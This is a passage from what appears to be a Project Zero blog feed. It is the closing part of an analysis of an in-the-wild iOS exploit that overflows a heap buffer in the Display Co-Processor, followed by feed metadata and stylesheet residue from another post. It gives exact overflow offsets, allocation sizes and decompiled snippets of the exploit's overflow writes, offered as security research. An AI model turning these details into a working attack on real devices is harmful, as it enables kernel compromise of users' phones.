 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; pages </span><span class="HovzfPYjjR-c1">+=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0x4000</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">}</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2"></span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>There's a distinct lack of bounds checking on </span><span class="HovzfPYjjR-c7">controlled_size</span><span>. Based on the structure of the code it looks like it should be restricted to be less than or equal to </span><span class="HovzfPYjjR-c7">64</span><span>&nbsp;(as that would result in the input being completely copied to the output buffer.) The </span><span class="HovzfPYjjR-c7">compensator-&gt;inline_buffer</span><span>&nbsp;buffer is inline in the compensator object. The structure of the code makes it look that that buffer is probably </span><span class="HovzfPYjjR-c7">0xc000</span><span>&nbsp;(three 16k pages) large. To verify this we need to find the allocation site of this compensator object.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>It's read from the </span><span class="HovzfPYjjR-c7">pipe_parent</span><span>&nbsp;object and we know that at this point </span><span class="HovzfPYjjR-c7">pipe_parent</span><span>&nbsp;is a </span><span class="HovzfPYjjR-c7">UPPipeDCP_H13P</span><span>&nbsp;object.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>There's only one write to that field, here in </span><span class="HovzfPYjjR-c7">UPPipeDCP_H13P::setup_tunables_base_target</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.76bc35a503bf64e16502962e6e6a4632f74fe58f"></a><a id="t.29"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">compensator </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">CXXnew</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c4">0xC608LL</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">...</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">compensator </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;compensator</span><span class="HovzfPYjjR-c1">;</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The compensator object is a </span><span class="HovzfPYjjR-c7">0xc608</span><span>&nbsp;byte allocation; the </span><span class="HovzfPYjjR-c7">0xc000</span><span>&nbsp;sized buffer starts at offset </span><span class="HovzfPYjjR-c7">0x24</span><span>&nbsp;so the allocation has enough space for </span><span class="HovzfPYjjR-c7">0xc608-0x24=0xC5E4</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;bytes before corrupting neighbouring objects.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The structure input provided by the exploit for the block handler 19 </span><span class="HovzfPYjjR-c7">setBlock</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;call looks like this:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.ab31ebe17a793d09fa94c11be61a4134ecf08386"></a><a id="t.30"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">struct_input_for_block_handler_19</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c4">0x5F4</span><span class="HovzfPYjjR-c1">]</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">70</span><span class="HovzfPYjjR-c1">;</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c30">// controlled_size</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">struct_input_for_block_handler_19</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c4">0x5F8</span><span class="HovzfPYjjR-c1">]</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;address</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">struct_input_for_block_handler_19</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c4">0x600</span><span class="HovzfPYjjR-c1">]</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;a_size</span><span class="HovzfPYjjR-c1">;</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>This leads to a value of 70 (0x46) for </span><span class="HovzfPYjjR-c7">controlled_size</span><span>&nbsp;in the </span><span class="HovzfPYjjR-c7">UniformityCompensator::set</span><span>&nbsp;snippet shown earlier. (</span><span class="HovzfPYjjR-c7">0x5f8</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">0x600</span><span>&nbsp;correspond to the offsets we saw earlier in the subtype's table: &nbsp;</span><span class="HovzfPYjjR-c7">&lt;2, 0, 0x5F8, 0x600&gt;)</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The inner loop increments the destination pointer by </span><span class="HovzfPYjjR-c7">0x100</span><span>&nbsp;each iteration so </span><span class="HovzfPYjjR-c7">0x46</span><span>&nbsp;loop iterations will write </span><span class="HovzfPYjjR-c7">0x4618</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;bytes.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The outer loop writes to three subsequent </span><span class="HovzfPYjjR-c7">0x4000</span><span>&nbsp;byte blocks so the third (final) iteration starts writing at </span><span class="HovzfPYjjR-c7">0x24 + 0x8000</span><span>&nbsp;and writes a total of </span><span class="HovzfPYjjR-c7">0x4618</span><span>&nbsp;bytes, meaning the object would need to be </span><span class="HovzfPYjjR-c7">0xC63C</span><span>&nbsp;bytes; but we can see that it's only </span><span class="HovzfPYjjR-c7">0xc608</span><span>, meaning that it will overflow the allocation size by </span><span class="HovzfPYjjR-c7">0x34</span><span>&nbsp;bytes. The RTKit malloc implementation looks like it adds 8 bytes of metadata to each allocation so the next object starts at </span><span class="HovzfPYjjR-c7">0xc610</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>How much input is consumed? The input is fully consumed with no "rewinding" so it's </span><span class="HovzfPYjjR-c7">3*0x46*0x46*4 = 0xe5b0</span><span>&nbsp;bytes. Working backwards from the end of that buffer we know that the final </span><span class="HovzfPYjjR-c7">0x34</span><span>&nbsp;bytes of it go off the end of the </span><span class="HovzfPYjjR-c7">0xc608</span><span>&nbsp;allocation which means </span><span class="HovzfPYjjR-c7">+0xe57c</span><span>&nbsp;in the input buffer will be the first byte which corrupts the </span><span class="HovzfPYjjR-c7">8</span><span>&nbsp;metadata bytes and </span><span class="HovzfPYjjR-c7">+0x8584</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;will be the first byte to corrupt the next object:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTc6JqgJIYvcwLtg14PNyjGRL4ds-1hzVvPPYmuSbJ3TiMHTXI3loB4Ib4caBv06WwUAa2H3eEldnlVKePnyUDTxYy6-W0VyMbVSn1YrcilcuOmjeYPwzdQ0ONiWlZbc34oZBXv6hftbOK57Qu_NupLfhgI-Iqc9U51KfJVF5YRk4YmBFcYdoaH27q/s1888/Screenshot%202022-06-22%20at%2016.54.15.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="A diagram showing that the end of the overflower object overlaps with the metadata and start of the target object." border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTc6JqgJIYvcwLtg14PNyjGRL4ds-1hzVvPPYmuSbJ3TiMHTXI3loB4Ib4caBv06WwUAa2H3eEldnlVKePnyUDTxYy6-W0VyMbVSn1YrcilcuOmjeYPwzdQ0ONiWlZbc34oZBXv6hftbOK57Qu_NupLfhgI-Iqc9U51KfJVF5YRk4YmBFcYdoaH27q/s1200/Screenshot%202022-06-22%20at%2016.54.15.png" style="max-height: 750; max-width: 600px;" title="A diagram showing that the end of the overflower object overlaps with the metadata and start of the target object." /></a></span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">This matches up exactly with the overflow object which the exploit builds:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.87397a57c7bdef65de5578925dd0ccccbdee255a"></a><a id="t.31"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; v24 </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;address </span><span class="HovzfPYjjR-c1">+</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c23">0xE584</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; v25 </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_DWORD </span><span class="HovzfPYjjR-c1">*)&amp;</span><span class="HovzfPYjjR-c0">v54</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c4">48</span><span class="HovzfPYjjR-c1">];</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; v26 </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_OWORD </span><span class="HovzfPYjjR-c1">*)&amp;</span><span class="HovzfPYjjR-c0">v54</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c4">32</span><span class="HovzfPYjjR-c1">];</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; v27 </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_OWORD </span><span class="HovzfPYjjR-c1">*)&amp;</span><span class="HovzfPYjjR-c0">v54</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c4">16</span><span class="HovzfPYjjR-c1">];</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_OWORD </span><span class="HovzfPYjjR-c1">*)(</span><span class="HovzfPYjjR-c0">address </span><span class="HovzfPYjjR-c1">+</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c23">0xE584</span><span class="HovzfPYjjR-c1">)</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_OWORD </span><span class="HovzfPYjjR-c1">*)</span><span class="HovzfPYjjR-c0">v54</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_OWORD </span><span class="HovzfPYjjR-c1">*)(</span><span class="HovzfPYjjR-c0">v24 </span><span class="HovzfPYjjR-c1">+</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">16</span><span class="HovzfPYjjR-c1">)</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;v27</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_OWORD </span><span class="HovzfPYjjR-c1">*)(</span><span class="HovzfPYjjR-c0">v24 </span><span class="HovzfPYjjR-c1">+</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">32</span><span class="HovzfPYjjR-c1">)</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;v26</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">*(</span><span class="HovzfPYjjR-c0">_DWORD </span><span class="HovzfPYjjR-c1">*)(</span><span class="HovzfPYjjR-c0">v24 </span><span class="HovzfPYjjR-c1">+</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">48</span><span class="HovzfPYjjR-c1">)</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;v25</span><span class="HovzfPYjjR-c1">;</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The destination object seems to be allocated very early and the DCP RTKit environment appears to be very deterministic with no ASLR. Almost certainly they are attempting to corrupt a neighbouring C++ object with a fake vtable pointer.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Unfortunately for our analysis the trail goes cold here and we can't fully recreate the rest of the exploit. The bytes for the fake DCP C++ object are read from a file in the app's temporary directory (</span><span>base64 encoded inside a JSON file under the </span><span class="HovzfPYjjR-c7">exploit_struct_offsets</span><span>&nbsp;key</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">) and I don't have a copy of that file. But based on the flow of the rest of the exploit it's pretty clear what happens next:</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.wtkqcqujjnsf"><span>sudo make me </span><span>a</span><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">&nbsp;DART mapping</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The DCP, like other coprocessors on iPhone, sits behind a DART (Device Address Resolution Table.) This is like an SMMU (IOMMU in the x86 world) which forces an extra layer of physical address lookup between the DCP and physical memory. </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://googleprojectzero.blogspot.com/2017/10/over-air-vol-2-pt-3-exploiting-wi-fi.html">DART was covered in great detail in Gal Beniamini's Over The Air - Vol. 2, Pt. 3 blog post</a></span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The DCP clearly needs to access lots of buffers owned by userspace tasks as well as memory managed by the kernel. To do this the DCP makes RPC calls back to the AP which modifies the DART entries accordingly. This appears to be exactly what the DCP exploit does: the D45X family of DCP-&gt;AP RPC methods appear to expose an interface for requesting arbitrary physical as well as virtual addresses to be mapped into the DCP DART.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The fake C++ object is most likely a stub which makes such calls on behalf of the exploit, allowing the exploit to read and write kernel memory.</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.gkcey04fmfci"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">Conclusions</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Segmentation and isolation are in general a positive thing when it comes to security. However, splitting up an existing system into separate, intercommunicating parts can end up exposing unexpected code in unexpected ways.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>We've had discussions within Project Zero about whether this DCP vulnerability is interesting at all. After all, if the </span><span class="HovzfPYjjR-c7">UniformityCompensator</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;code was going to be running on the Application Processors anyway then the Display Co-Processor didn't really introduce or cause this bug.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Whilst that's true, it's also the case that the DCP certainly made exploitation of this bug significantly easier and more reliable than it would have been on the AP. Apple has invested heavily in memory corruption mitigations over the last few years, so moving an attack surface from a "mitigation heavy" environment to a "mitigation light" one is a regression in that sense.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Another perspective is that the DCP just isn't isolated enough; perhaps the intention was to try to isolate the code on the DCP such that even if it's compromised it's limited in the effect it could have on the entire system. For example, there might be models where the DCP to AP RPC interface is much more restricted.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">But again there's a tradeoff: the more restrictive the RPC API, the more the DCP code has to be refactored - a significant investment. Currently, the codebase relies on being able to map arbitrary memory and the API involves passing userspace pointers back and forth.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>I've discussed in recent posts how attackers tend to be ahead of the curve. As the curve slowly shifts towards memory corruption exploitation getting more expensive, attackers are likely shifting too. We saw that in the </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html">logic-bug sandbox escape used by NSO</a></span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;and we see that here in this memory-corruption-based privilege escalation that side-stepped kernel mitigations by corrupting memory on a co-processor instead. Both are quite likely to continue working in some form in a post-memory tagging world. Both reveal the stunning depth of attack surface available to the motivated attacker. And both show that defensive security research still has a lot of work to do.</span></p></body>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/5973748726134682294/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5973748726134682294
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5973748726134682294
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html
## @title
The curious tale of a fake Carrier.app
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioBjlvs-GjJW9ZocxERk7cU6J-bBcWIjauCAzuI6QoMvdQENbSjF6elAZ0yUpLbHfTmOzfdKWBhB_FFR8X9UF1yMqN9XSMmJSUDZ_uVX_zctpmYMaD0G6V7bi68tdJ2C-e3eyM715_cTywzOWAgSbPyazbNtMv65p0lWewhacxCox_vrztKXdRZdjB/s72-c/Screenshot%202022-06-22%20at%2016.52.33.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-2485989426162409270
## published
14/06/2022 13:00:00
## updated
14/06/2022 13:00:24
## title
## @type
text
## #text
An Autopsy on a Zombie In-the-Wild 0-day
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');.lst-kix_vnkr79j0brd5-6>li:before{content:"\0025cf  "}.lst-kix_vnkr79j0brd5-8>li:before{content:"\0025a0  "}ol.lst-kix_rpn0sahs9m0k-5.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-5 0}.lst-kix_rpn0sahs9m0k-1>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-1}.lst-kix_vnkr79j0brd5-5>li:before{content:"\0025a0  "}.lst-kix_vnkr79j0brd5-2>li:before{content:"\0025a0  "}.lst-kix_vnkr79j0brd5-4>li:before{content:"\0025cb  "}ol.lst-kix_rpn0sahs9m0k-8.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-8 0}.lst-kix_vnkr79j0brd5-3>li:before{content:"\0025cf  "}.lst-kix_vnkr79j0brd5-0>li:before{content:"\0025cf  "}.lst-kix_vnkr79j0brd5-1>li:before{content:"\0025cb  "}ol.lst-kix_omx22nj2js1z-1.start{counter-reset:lst-ctn-kix_omx22nj2js1z-1 0}.lst-kix_omx22nj2js1z-0>li{counter-increment:lst-ctn-kix_omx22nj2js1z-0}ul.lst-kix_vnkr79j0brd5-4{list-style-type:none}ul.lst-kix_vnkr79j0brd5-3{list-style-type:none}ul.lst-kix_vnkr79j0brd5-2{list-style-type:none}ul.lst-kix_vnkr79j0brd5-1{list-style-type:none}.lst-kix_omx22nj2js1z-1>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-1,lower-latin) ". "}ul.lst-kix_vnkr79j0brd5-8{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-0.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-0 0}ul.lst-kix_vnkr79j0brd5-7{list-style-type:none}.lst-kix_omx22nj2js1z-0>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-0,decimal) ". "}ul.lst-kix_vnkr79j0brd5-6{list-style-type:none}ul.lst-kix_vnkr79j0brd5-5{list-style-type:none}ul.lst-kix_vnkr79j0brd5-0{list-style-type:none}.lst-kix_vnkr79j0brd5-7>li:before{content:"\0025cb  "}.lst-kix_omx22nj2js1z-2>li{counter-increment:lst-ctn-kix_omx22nj2js1z-2}.lst-kix_omx22nj2js1z-8>li{counter-increment:lst-ctn-kix_omx22nj2js1z-8}.lst-kix_3vloefecb731-0>li:before{content:"\0025cf  "}ol.lst-kix_omx22nj2js1z-0.start{counter-reset:lst-ctn-kix_omx22nj2js1z-0 0}ul.lst-kix_ziaggw1wsf95-3{list-style-type:none}ul.lst-kix_ziaggw1wsf95-4{list-style-type:none}ol.lst-kix_omx22nj2js1z-7.start{counter-reset:lst-ctn-kix_omx22nj2js1z-7 0}ul.lst-kix_ziaggw1wsf95-5{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-3.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-3 0}ul.lst-kix_ziaggw1wsf95-6{list-style-type:none}ul.lst-kix_ziaggw1wsf95-0{list-style-type:none}ul.lst-kix_ziaggw1wsf95-1{list-style-type:none}ul.lst-kix_ziaggw1wsf95-2{list-style-type:none}ul.lst-kix_3vloefecb731-0{list-style-type:none}.lst-kix_3vloefecb731-5>li:before{content:"\0025a0  "}.lst-kix_3vloefecb731-4>li:before{content:"\0025cb  "}.lst-kix_3vloefecb731-1>li:before{content:"\0025cb  "}ul.lst-kix_3vloefecb731-8{list-style-type:none}ul.lst-kix_3vloefecb731-7{list-style-type:none}ul.lst-kix_3vloefecb731-6{list-style-type:none}ul.lst-kix_3vloefecb731-5{list-style-type:none}.lst-kix_3vloefecb731-3>li:before{content:"\0025cf  "}ul.lst-kix_3vloefecb731-4{list-style-type:none}ul.lst-kix_3vloefecb731-3{list-style-type:none}.lst-kix_3vloefecb731-2>li:before{content:"\0025a0  "}ul.lst-kix_3vloefecb731-2{list-style-type:none}ul.lst-kix_3vloefecb731-1{list-style-type:none}.lst-kix_rpn0sahs9m0k-8>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-8}ol.lst-kix_omx22nj2js1z-6.start{counter-reset:lst-ctn-kix_omx22nj2js1z-6 0}.lst-kix_rpn0sahs9m0k-2>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-2}.lst-kix_rpn0sahs9m0k-5>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-5}.lst-kix_3vloefecb731-7>li:before{content:"\0025cb  "}.lst-kix_3vloefecb731-6>li:before{content:"\0025cf  "}.lst-kix_3vloefecb731-8>li:before{content:"\0025a0  "}ol.lst-kix_rpn0sahs9m0k-2.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-2 0}.lst-kix_omx22nj2js1z-5>li{counter-increment:lst-ctn-kix_omx22nj2js1z-5}ol.lst-kix_rpn0sahs9m0k-1.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-1 0}.lst-kix_omx22nj2js1z-4>li{counter-increment:lst-ctn-kix_omx22nj2js1z-4}.lst-kix_rpn0sahs9m0k-6>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-6}ol.lst-kix_rpn0sahs9m0k-4.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-4 0}ol.lst-kix_omx22nj2js1z-8.start{counter-reset:lst-ctn-kix_omx22nj2js1z-8 0}ol.lst-kix_omx22nj2js1z-2.start{counter-reset:lst-ctn-kix_omx22nj2js1z-2 0}ul.lst-kix_ziaggw1wsf95-7{list-style-type:none}ul.lst-kix_ziaggw1wsf95-8{list-style-type:none}.lst-kix_omx22nj2js1z-3>li{counter-increment:lst-ctn-kix_omx22nj2js1z-3}ol.lst-kix_rpn0sahs9m0k-7.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-7 0}.lst-kix_omx22nj2js1z-6>li{counter-increment:lst-ctn-kix_omx22nj2js1z-6}.lst-kix_rpn0sahs9m0k-4>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-4}.lst-kix_rpn0sahs9m0k-7>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-7}ol.lst-kix_omx22nj2js1z-5.start{counter-reset:lst-ctn-kix_omx22nj2js1z-5 0}.lst-kix_rpn0sahs9m0k-5>li:before{content:"(" counter(lst-ctn-kix_rpn0sahs9m0k-5,lower-roman) ") "}.lst-kix_rpn0sahs9m0k-6>li:before{content:"" counter(lst-ctn-kix_rpn0sahs9m0k-6,decimal) ". "}.lst-kix_rpn0sahs9m0k-4>li:before{content:"(" counter(lst-ctn-kix_rpn0sahs9m0k-4,lower-latin) ") "}.lst-kix_rpn0sahs9m0k-8>li:before{content:"" counter(lst-ctn-kix_rpn0sahs9m0k-8,lower-roman) ". "}.lst-kix_rpn0sahs9m0k-1>li:before{content:"" counter(lst-ctn-kix_rpn0sahs9m0k-1,lower-latin) ") "}.lst-kix_rpn0sahs9m0k-2>li:before{content:"" counter(lst-ctn-kix_rpn0sahs9m0k-2,lower-roman) ") "}.lst-kix_rpn0sahs9m0k-3>li:before{content:"(" counter(lst-ctn-kix_rpn0sahs9m0k-3,decimal) ") "}.lst-kix_omx22nj2js1z-2>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-2,lower-roman) ". 